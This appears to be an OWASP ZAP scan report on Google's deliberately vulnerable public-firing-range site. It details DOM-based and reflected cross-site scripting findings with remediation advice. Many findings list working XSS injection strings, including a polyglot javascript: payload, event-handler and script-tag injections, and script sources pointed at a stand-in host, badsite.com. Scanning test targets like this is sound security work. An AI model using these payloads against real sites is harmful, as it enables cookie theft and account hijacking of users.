# ZAP Scanning Report


## Summary of Alerts

| Risk Level | Number of Alerts |
| --- | --- |
| High | 6 |
| Medium | 12 |
| Low | 11 |
| Informational | 14 |




## Alerts

| Name | Risk Level | Number of Instances |
| --- | --- | --- |
| Cross Site Scripting (DOM Based) | High | 20 |
| Cross Site Scripting (Reflected) | High | 63 |
| External Redirect | High | 3 |
| Open Redirect | High | 1 |
| Server Side Request Forgery | High | 3 |
| Source Code Disclosure - File Inclusion | High | 71 |
| .htaccess Information Leak | Medium | 6 |
| Absence of Anti-CSRF Tokens | Medium | 4 |
| Anti-CSRF Tokens Check | Medium | 5 |
| Bypassing 403 | Medium | 1 |
| CSP: Wildcard Directive | Medium | 1 |
| CSP: script-src unsafe-eval | Medium | 1 |
| CSP: style-src unsafe-inline | Medium | 1 |
| Content Security Policy (CSP) Header Not Set | Medium | 11 |
| Format String Error | Medium | 1 |
| Missing Anti-clickjacking Header | Medium | 11 |
| Secure Pages Include Mixed Content (Including Scripts) | Medium | 7 |
| Sub Resource Integrity Attribute Missing | Medium | 8 |
| Application Error Disclosure | Low | 2 |
| CSP: Notices | Low | 1 |
| Cookie Without Secure Flag | Low | 2 |
| Cookie without SameSite Attribute | Low | 2 |
| Cross-Domain JavaScript Source File Inclusion | Low | 12 |
| Dangerous JS Functions | Low | 13 |
| HTTPS Content Available via HTTP | Low | 317 |
| Permissions Policy Header Not Set | Low | 11 |
| Private IP Disclosure | Low | 2 |
| Strict-Transport-Security Header Not Set | Low | 11 |
| X-Content-Type-Options Header Missing | Low | 11 |
| Cookie Slack Detector | Informational | 2 |
| GET for POST | Informational | 2 |
| Information Disclosure - Suspicious Comments | Informational | 7 |
| Modern Web Application | Informational | 12 |
| Re-examine Cache-control Directives | Informational | 11 |
| Sec-Fetch-Dest Header is Missing | Informational | 3 |
| Sec-Fetch-Mode Header is Missing | Informational | 3 |
| Sec-Fetch-Site Header is Missing | Informational | 3 |
| Sec-Fetch-User Header is Missing | Informational | 3 |
| Session Management Response Identified | Informational | 2 |
| Storable and Cacheable Content | Informational | 12 |
| User Agent Fuzzer | Informational | 48 |
| User Controllable HTML Element Attribute (Potential XSS) | Informational | 9 |
| User Controllable JavaScript Event (XSS) | Informational | 3 |




## Alert Detail



### [ Cross Site Scripting (DOM Based) ](https://www.zaproxy.org/docs/alerts/40026/)



##### High (High)

### Description

Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.
When an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.

There are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.
Non-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.
Persistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.

* URL: https://public-firing-range.appspot.com/address/location.hash/assign%23javascript:alert(5397&29
  * Method: `GET`
  * Parameter: ``
  * Attack: `#javascript:alert(5397)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/address/location.hash/eval%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/address/location.hash/formaction%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: `Tag name: input Att name:  Att id: `
* URL: https://public-firing-range.appspot.com/address/location.hash/function%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/address/location.hash/inlineevent%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: `Tag name: div Att name: null Att id: `
* URL: https://public-firing-range.appspot.com/address/location.hash/replace%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/address/location.hash/setTimeout%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/dompropagation%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/dompropagation/%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/eventtriggering/document/formSubmission/innerHtml%3Fname=abc%23%3Cimg%20src=%22random.gif%22%20onerror=alert(5397&29%3E
  * Method: `GET`
  * Parameter: ``
  * Attack: `?name=abc#<img src="random.gif" onerror=alert(5397)>`
  * Evidence: ``
  * Other Info: `Tag name: input Att name:  Att id: `
* URL: https://public-firing-range.appspot.com/dom/eventtriggering/document/inputTyping/innerHtml%3Fname=abc%23%3Cimg%20src=%22random.gif%22%20onerror=alert(5397&29%3E
  * Method: `GET`
  * Parameter: ``
  * Attack: `?name=abc#<img src="random.gif" onerror=alert(5397)>`
  * Evidence: ``
  * Other Info: `Tag name: input Att name:  Att id: `
* URL: https://public-firing-range.appspot.com/reflected/parameter/form%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: `Tag name: input Att name:  Att id: `
* URL: https://public-firing-range.appspot.com/remoteinclude/object_hash.html%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/location/hash/document.location%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/location/hash/embed.src%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/location/hash/form.action%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: `Tag name: input Att name:  Att id: `
* URL: https://public-firing-range.appspot.com/urldom/location/hash/iframe.src%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/location/hash/input.formaction%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: `Tag name: input Att name:  Att id: `
* URL: https://public-firing-range.appspot.com/urldom/location/hash/object.data%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `GET`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/form%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
  * Method: `POST`
  * Parameter: ``
  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
  * Evidence: ``
  * Other Info: `Tag name: input Att name:  Att id: `

Instances: 20

### Solution

Phase: Architecture and Design
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.

Phases: Implementation; Architecture and Design
Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.
For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.
Consult the XSS Prevention Cheat Sheet for more details on the types of encoding and escaping that are needed.

Phase: Architecture and Design
For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.

If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.

Phase: Implementation
For every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.

To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.

Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."

Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.
	

### Reference


* [ https://owasp.org/www-community/attacks/xss/ ](https://owasp.org/www-community/attacks/xss/)
* [ https://cwe.mitre.org/data/definitions/79.html ](https://cwe.mitre.org/data/definitions/79.html)


#### CWE Id: [ 79 ](https://cwe.mitre.org/data/definitions/79.html)


#### WASC Id: 8

#### Source ID: 1

### [ Cross Site Scripting (Reflected) ](https://www.zaproxy.org/docs/alerts/40012/)



##### High (Medium)

### Description

Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.
When an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.

There are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.
Non-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.
Persistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.

* URL: https://public-firing-range.appspot.com/angular/angular_body_attribute_ng/1.4.0%3Fq=%2522+onMouseOver%253D%2522alert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `" onMouseOver="alert(1);`
  * Evidence: `" onMouseOver="alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/angular_body_attribute_non_ng/1.4.0%3Fq=%2522+onMouseOver%253D%2522alert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `" onMouseOver="alert(1);`
  * Evidence: `" onMouseOver="alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/angular_body_attribute_non_ng_raw/1.4.0%3Fq=%2522+onMouseOver%253D%2522alert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `" onMouseOver="alert(1);`
  * Evidence: `" onMouseOver="alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_name%3Fq=accesskey%253D%2527x%2527+onclick%253D%2527alert%25281%2529%2527+b
  * Method: `GET`
  * Parameter: `q`
  * Attack: `accesskey='x' onclick='alert(1)' b`
  * Evidence: `accesskey='x' onclick='alert(1)' b`
  * Other Info: `The accesskey attribute specifies a shortcut key to activate/focus an element. This attribute can trigger payloads for non-conventional or custom tags.`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_quoted%3Fq=%2522+onMouseOver%253D%2522alert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `" onMouseOver="alert(1);`
  * Evidence: `" onMouseOver="alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_script%3Fq=%2522+src%253Dhttp%253A%252F%252Fbadsite.com
  * Method: `GET`
  * Parameter: `q`
  * Attack: `" src=http://badsite.com`
  * Evidence: `" src=http://badsite.com`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_singlequoted%3Fq=%2527+onMouseOver%253D%2527alert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `' onMouseOver='alert(1);`
  * Evidence: `' onMouseOver='alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_unquoted%3Fq=+onMouseOver%253Dalert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: ` onMouseOver=alert(1);`
  * Evidence: ` onMouseOver=alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_import%3Fq=javascript%253Aalert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `javascript:alert(1);`
  * Evidence: `javascript:alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_assignment%3Fq=%253Balert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `;alert(1);`
  * Evidence: `;alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_comment%3Fq=%2522%253Balert%25281%2529%253B%2522
  * Method: `GET`
  * Parameter: `q`
  * Attack: `";alert(1);"`
  * Evidence: `";alert(1);"`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_eval%3Fq=%253Balert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `;alert(1);`
  * Evidence: `;alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_quoted_string%3Fq=%2522%253Balert%25281%2529%253B%2522
  * Method: `GET`
  * Parameter: `q`
  * Attack: `";alert(1);"`
  * Evidence: `";alert(1);"`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_singlequoted_string%3Fq=%2527%253Balert%25281%2529%253B%2527
  * Method: `GET`
  * Parameter: `q`
  * Attack: `';alert(1);'`
  * Evidence: `';alert(1);'`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_slashquoted_string%3Fq=%253Balert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `;alert(1);`
  * Evidence: `;alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/tagname%3Fq=tag+accesskey%253D%2527x%2527+onclick%253D%2527alert%25281%2529%2527+b
  * Method: `GET`
  * Parameter: `q`
  * Attack: `tag accesskey='x' onclick='alert(1)' b`
  * Evidence: `tag accesskey='x' onclick='alert(1)' b`
  * Other Info: `The accesskey attribute specifies a shortcut key to activate/focus an element. This attribute can trigger payloads for non-conventional or custom tags.`
* URL: https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE%3Fq=%253Balert%25281%2529
  * Method: `GET`
  * Parameter: `q`
  * Attack: `;alert(1)`
  * Evidence: `;alert(1)`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE%3Fq=%253Balert%25281%2529
  * Method: `GET`
  * Parameter: `q`
  * Attack: `;alert(1)`
  * Evidence: `;alert(1)`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE%3Fq=%253Balert%25281%2529
  * Method: `GET`
  * Parameter: `q`
  * Attack: `;alert(1)`
  * Evidence: `;alert(1)`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/filteredcharsets/attribute_unquoted/DoubleQuoteSinglequote%3Fq=%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `><scrIpt>alert(1);</scRipt>`
  * Evidence: `><scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/filteredcharsets/body/SpaceDoubleQuoteSlashEquals%3Fq=%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `<scrIpt>alert(1);</scRipt>`
  * Evidence: `<scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseInsensitive/script%3Fq=%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `<img src=x onerror=prompt()>`
  * Evidence: `<img src=x onerror=prompt()>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/script%3Fq=%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `<scrIpt>alert(1);</scRipt>`
  * Evidence: `<scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_name%3Fq=accesskey%253D%2527x%2527+onclick%253D%2527alert%25281%2529%2527+b
  * Method: `GET`
  * Parameter: `q`
  * Attack: `accesskey='x' onclick='alert(1)' b`
  * Evidence: `accesskey='x' onclick='alert(1)' b`
  * Other Info: `The accesskey attribute specifies a shortcut key to activate/focus an element. This attribute can trigger payloads for non-conventional or custom tags.`
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_quoted%3Fq=%2522%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `"><scrIpt>alert(1);</scRipt>`
  * Evidence: `"><scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_script%3Fq=%2522+src%253Dhttp%253A%252F%252Fbadsite.com
  * Method: `GET`
  * Parameter: `q`
  * Attack: `" src=http://badsite.com`
  * Evidence: `" src=http://badsite.com`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_singlequoted%3Fq=%2527%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `'><scrIpt>alert(1);</scRipt>`
  * Evidence: `'><scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_unquoted%3Fq=%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `><scrIpt>alert(1);</scRipt>`
  * Evidence: `><scrIpt>alert(1);</scRipt>`
  * Other Info: ``
